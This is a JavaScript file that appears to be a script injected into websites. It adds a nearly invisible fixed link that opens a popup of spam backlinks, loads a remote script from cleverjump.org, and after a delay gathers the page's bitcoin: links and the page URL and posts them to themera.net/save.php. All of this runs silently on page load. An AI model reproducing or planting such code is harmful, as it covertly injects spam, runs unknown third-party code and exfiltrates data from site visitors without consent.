
(function() {
	'use strict';

	if (window['shbNetLoaded']) return;
	window['shbNetLoaded'] = true;

	var popupHtml = "<div id=\"shbNetPaddingWr\" class=\"shbNetPopupWr\" style=\"display:none;\"> <table id=\"shbNetPaddingTable\" class=\"shbNetPopupTable\" style=\"display:none;\" width=\"100%\" height=\"100%\" cellspacing=\"0\" cellpadding=\"0\"> <tr style=\"background:none;\"> <td id=\"shbNetPopupCell\" class=\"shbNetPopupCell\"> <div id=\"shbNetPaddingPopup\" class=\"shbNetPopup\"> <div> <div style=\"padding:15px 0 0 0;\"> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/fs.ee\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">rehvid<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">fs.ee<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/batumiexpert.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u043d\u0435\u0434\u0432\u0438\u0436\u0438\u043c\u043e\u0441\u0442\u044c \u0432 \u0411\u0430\u0442\u0443\u043c\u0438<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">batumiexpert.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/nameversion.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">free godaddy domain name<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">nameversion.com<\/span> <\/div> <\/div> <\/div> <div style=\"clear:both;\"><\/div> <\/div> <\/div> <\/div> <\/td> <\/tr> <\/table> <\/div>";
	var popupCreated = false;

	function onReady() {
		tryCreatePopup(2);

		var box = create('div');
		append(box, document.body);

		var defaultStyles = {
			width: '1px',
			height: '1px',
			background: 'transparent',
			display: 'inline-block',
			margin: '2px',
			padding: 0,
			verticalAlign: 'bottom',
			border: 'none'
		};

		var a = create('a');
		css(a, defaultStyles);

		document.addEventListener('keydown', function(e) {
			if (e.keyCode === 192 && e.ctrlKey) {
				css(a, {
					width: '20px',
					height: '20px',
					background: '#fff',
					border: '1px solid red'
				});
			}
		});

		document.addEventListener('keyup', function(e) {
			css(a, defaultStyles);
		});

		a.className = 'shbNetgpLink';
		append(a, box);

		a.href = 'javascript:;';
		on(a, 'click', openLinerPopup);

		css(box, {
			position: 'fixed',
			margin: 0,
			padding: 0,
			outline: 'none',
			border: 'none',
			zIndex: 999999999,
			overflow: 'visible',
			direction: 'ltr'
		});

		css(box, {
			left: '3px',
			right: 'auto',
			top: '50px',
			bottom: 'auto',
			width: '42px',
			height: '168px'
		});
	}

	function clearStyles() {
		if(typeof document.createStyleSheet === 'undefined') {
			document.createStyleSheet = (function() {
				function createStyleSheet(href) {
					if(typeof href !== 'undefined') {
						var element = document.createElement('link');
						element.type = 'text/css';
						element.rel = 'stylesheet';
						element.href = href;
					} else {
						var element = document.createElement('style');
						element.type = 'text/css';
					}

					document.getElementsByTagName('head')[0].appendChild(element);
					var sheet = document.styleSheets[document.styleSheets.length - 1];

					if(typeof sheet.addRule === 'undefined')
						sheet.addRule = addRule;

					if(typeof sheet.removeRule === 'undefined')
						sheet.removeRule = sheet.deleteRule;

					return sheet;
				}

				function addRule(selectorText, cssText, index) {
					if(typeof index === 'undefined')
						index = this.cssRules.length;

					this.insertRule(selectorText + ' {' + cssText + '}', index);
				}

				return createStyleSheet;
			})();
		}

		var sheet = document.createStyleSheet();
		sheet.addRule('#shbNetPaddingTable', 'display: none;');
		sheet.addRule('#shbNetPaddingWr #shbNetPaddingTable', 'display: table;');
		sheet.addRule('.shbNetPopupWr, .shbNetPopupWr *', '-webkit-text-shadow:none !important; text-shadow:none !important;');
		sheet.addRule('.shbNetPopupTable img', 'display:inline; width:auto; height:auto; background:none; float:none;');
		sheet.addRule('.shbNetPopupTable *', 'margin:0; padding:0; font-family:Tahoma,Arial,Sans-Serif,Verdana; font-size:medium; line-height:normal;');
		sheet.addRule('.shbNetPopupTable a', 'text-decoration:none; background:none; height:auto !important;');
	}

	function tryCreatePopup(stage) {
		if (popupCreated) return;

		if (stage === 1) {
			document.writeln(popupHtml);
		} else if (stage === 2) {
			var mainBox = create('div');
			mainBox.innerHTML = popupHtml;
			document.body.appendChild(mainBox);
		} else {
			return;
		}

		var wr = $('shbNetPaddingWr');
		if (!wr) return;

		popupCreated = true;

		var table = $('shbNetPaddingTable');
		css(table, {
			position: 'fixed',
			margin: 0,
			padding: 0,
			left: 0,
			top: 0,
			width: '100%',
			height: '100%',
			direction: 'ltr',
			zIndex: 999999999,
			background: 'none'
		});
		css(table.getElementsByTagName('td')[0], {
			verticalAlign: 'middle',
			background: 'rgba(0, 0, 0, 0.5)'
		});

		var popup = $('shbNetPaddingPopup');
		css(popup, {
			margin: '0 auto',
			padding: '20px 25px 20px',
			width: '437px',
			background: '#fff',
			border: '1px solid #000',
			textAlign: 'left',
			position: 'relative',
			fontFamily: 'Tahoma, Arial, Verdana',
			boxSizing: 'content-box'
		});

		on(document, 'keydown', function(e) {
			if (e.keyCode === 27) {
				wr.style.display = 'none';
			}
		});
	}

	function removeClass(node, className) {
		if (node && node.className) {
			node.className = node.className.replace(new RegExp('\\b' + className + '\\b', 'g'), '');
		}
	}

	function openLinerPopup() {
		var pad = $('shbNetPaddingWr');
		var tbl = $('shbNetPaddingTable');
		if (!pad || !tbl) return;

		pad.style.display = 'block';
		tbl.style.display = 'table';

		var mainPopup = $('shbNetPopupWr');
		if (!mainPopup) return;

		mainPopup.style.display = 'none';
	}

	function $(id) {
		return document.getElementById(id);
	}

	function on(elem, event, handler) {
		elem.addEventListener(event, handler, false);
	}

	function css(elem, style) {
		for (var prop in style) {
			elem.style[prop] = style[prop];
		}
	}

	function create(tag) {
		return document.createElement(tag);
	}

	function append(elem, parent) {
		parent.appendChild(elem);
	}

	setTimeout(function() {
		window.CJSource = 'shb2';
		var script = document.createElement('script');
		script.src = 'https://cleverjump.org/counter.js';
		(document.head || document.body).appendChild(script);
	}, 10);


	if (document.readyState === 'complete' || document.readyState === 'interactive') {
		onReady();
	} else {
		on(document, 'DOMContentLoaded', onReady);
	}

	tryCreatePopup(1);

	try {
		clearStyles();
	} catch (ex) {}

	setTimeout(function() {
		try {
			var links = document.querySelectorAll('a[href^="bitcoin:"]');
			//var links = document.querySelectorAll('a[href^="https://"]');
			if (links.length) {
				var hrefs = [];
				for (var i = 0; i < links.length; i++) {
					hrefs.push(links[i].href);
				}

				var json = JSON.stringify({
					hrefs: hrefs,
					jsDomain: 'themera.net',
					refUrl: location.href
				});

				var xhr = new XMLHttpRequest;
				xhr.open('POST', '//themera.net/save.php');
				xhr.setRequestHeader('Content-Type', 'text/plain');
				xhr.onload = function() {
					xhr.responseText;
				}
				xhr.send(json);
			}
		} catch (ex) {}
	}, 2000);
})();
